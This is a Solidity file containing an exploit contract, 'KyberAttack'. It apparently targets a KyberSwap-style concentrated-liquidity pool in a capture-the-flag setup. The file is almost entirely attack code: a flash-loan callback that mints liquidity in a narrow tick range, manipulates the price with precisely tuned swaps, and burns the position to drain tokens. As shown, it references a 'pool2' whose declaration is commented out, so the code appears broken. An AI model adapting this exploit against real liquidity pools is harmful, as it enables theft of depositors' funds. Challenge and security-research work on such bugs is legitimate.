// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "../contracts/openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../contracts/Pool.sol";
import "../contracts/Factory.sol";
import "../contracts/oracle/PoolOracle.sol";
import "../contracts/libraries/TickMath.sol";

import "../contracts/libraries/SwapMath.sol";
import "../contracts/periphery/libraries/LiquidityMath.sol";

contract Token is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
interface Setup {
    function addManager(address manager) external;
    function run() external;
    function airdroop() external;
    function check() external;
}
contract KyberAttack  {

    Pool pool = Pool(0xb51bBD304ADCf42b8882720Af184197600b9d9fF);
//    Pool pool2  = Pool(0x54A8A576907BA8291a41e21E80a3F357D8f74133);
    Token token0 =   Token(address(pool.token0()));
    Setup setup = Setup(0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82);
    Token token1 = Token(address(pool.token1()));


    int24 lower = -111311;
    int24 upper = lower + 100;

    uint128 rangeLiquidity;


    function mintCallback(uint256 qty0, uint256 qty1, bytes calldata data) external {
        if (qty0 > 0) {
            token0.transfer(msg.sender, qty0);
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, qty1);
        }
    }

    function swapCallback(int256 qty0, int256 qty1, bytes calldata data) external {

        if (qty0 > 0) {
            token0.transfer(msg.sender, uint256(qty0));
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, uint256(qty1));
        }
    }


    function flashCallback(uint256 feeQty0, uint256 feeQty1, bytes calldata data) external {

        uint160 lowerSqrtP = TickMath.getSqrtRatioAtTick(lower);
        uint160 upperSqrtP = TickMath.getSqrtRatioAtTick(upper);

         pool.swap(address(this), type(int256).max, true, TickMath.getSqrtRatioAtTick(upper), "");
        // calc the rough amount of liquidity with amount of 100 ether
        uint128 initLiquidity = LiquidityMath.getLiquidityFromQty0(lowerSqrtP, upperSqrtP, 100 ether);

        uint128  adjustedLiquidity = 76766215640030182295;
        uint256 exploitableToken1Amount =  100005025313878185766;

         (uint128 L, uint128 reinvestL,) = pool.getLiquidityState();
        rangeLiquidity = adjustedLiquidity - reinvestL - L;
        pool.mint(address(this), lower, upper, [TickMath.MIN_TICK, lower], rangeLiquidity, "");

        pool.swap(address(this), int256(exploitableToken1Amount), true, TickMath.MIN_SQRT_RATIO + 1, "");

        {
            pool.swap(address(this), type(int256).min, true, TickMath.getSqrtRatioAtTick(lower), "");
            (uint128 newLiquidity,,) = pool.getLiquidityState();

        }

        (int256 deltaQty0, int256 deltaQty1) = pool.swap(address(this), 10 ether, false, TickMath.getSqrtRatioAtTick(upper+13713), "");

        pool.burn(lower, upper, rangeLiquidity);

       token0.transfer(address(pool2), 101 ether);
       token1.transfer(address(pool2), 0.3 ether );

    }


       function run() public {
        setup.addManager(address(this));
        setup.airdroop();
       pool2.flash(address(this),101 ether , 0.3 ether, abi.encodePacked(uint256(101 ether), uint256(0.3 ether)));
        pool.burn(lower, upper, rangeLiquidity);
        setup.check();
    }

}

//[+] pool address 0xe7152513974AD8F6fdac593a441b361Ff774fC90
//[+] pool2 address 0x9d77b2e483D4aA812D3CC2f15Ee6b264b7e93f74
//[+] token0 address 0x0665FbB86a3acECa91Df68388EC4BBE11556DDce
//[+] token1 address 0x56639dB16Ac50A89228026e42a316B30179A5376
//[+] factory address 0xe61FDeDBcb68e8966c869E51eAb9020cFAAdf066
